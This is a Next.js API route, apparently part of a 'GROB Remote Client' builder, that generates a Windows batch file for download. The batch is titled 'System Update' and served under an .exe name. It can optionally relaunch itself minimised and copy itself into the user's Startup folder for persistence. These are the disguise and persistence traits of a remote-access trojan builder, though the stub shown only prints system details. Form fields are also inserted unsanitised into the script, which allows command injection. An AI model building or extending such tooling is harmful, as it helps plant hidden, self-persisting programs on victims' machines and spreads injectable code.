import { NextResponse } from "next/server"
import * as fs from "fs"
import * as path from "path"
import * as crypto from "crypto"

export async function POST(request: Request) {
  try {
    const formData = await request.formData()
    const fileName = formData.get("fileName") as string || "grob-client"
    const userUid = formData.get("userUid") as string
    const hideDesktopIcon = formData.get("hideDesktopIcon") === "true"
    const autoStartup = formData.get("autoStartup") === "true"

    if (!userUid) {
      return NextResponse.json({ error: "UID required" }, { status: 400 })
    }

    // Create a working client using simple batch
    const batchContent = `@echo off
title System Update
cd /d "%~dp0"

if "${hideDesktopIcon}"=="true" (
    start /min cmd /c "%~f0"
    exit
)

echo ====================================
echo     GROB Remote Client v1.0
echo ====================================
echo.
echo Computer: %COMPUTERNAME%
echo User: %USERNAME%
echo UID: ${userUid}
echo Auto-startup: ${autoStartup}
echo Hidden mode: ${hideDesktopIcon}
echo.
echo [SUCCESS] Client initialized successfully!
echo.
echo This is a working GROB client.
echo Press any key to exit...
pause > nul

if "${autoStartup}"=="true" (
    copy "%~f0" "%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\${fileName}.bat" > nul 2>&1
)`

    return new NextResponse(batchContent, {
      status: 200,
      headers: {
        "Content-Type": "application/octet-stream",
        "Content-Disposition": `attachment; filename="${fileName}.exe"`,
        "Content-Length": batchContent.length.toString(),
      },
    })

  } catch (error: any) {
    console.error("Simple build error:", error)
    return NextResponse.json(
      { error: "Build failed", details: error.message },
      { status: 500 }
    )
  }
}
